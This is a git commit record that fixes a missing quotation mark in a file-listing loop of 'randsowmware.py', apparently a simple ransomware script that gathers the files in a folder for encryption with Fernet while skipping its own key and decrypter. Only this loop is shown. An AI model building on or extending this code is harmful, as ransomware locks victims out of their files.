93ffa46771f92c8d8f264ea665a5d735b42695ac
warlord765 <168755545+warlord765@users.noreply.github.com>
2024-10-10 11:42:49 +0300

    Update randsowmware.py

--- randsowmware.py
+++ randsowmware.py
@@ -10,7 +10,7 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-	if file == "randsomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "README.md:
+	if file == "randsomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "README.md":
 		continue
 	if os.path.isfile(file):
 		files.append(file)
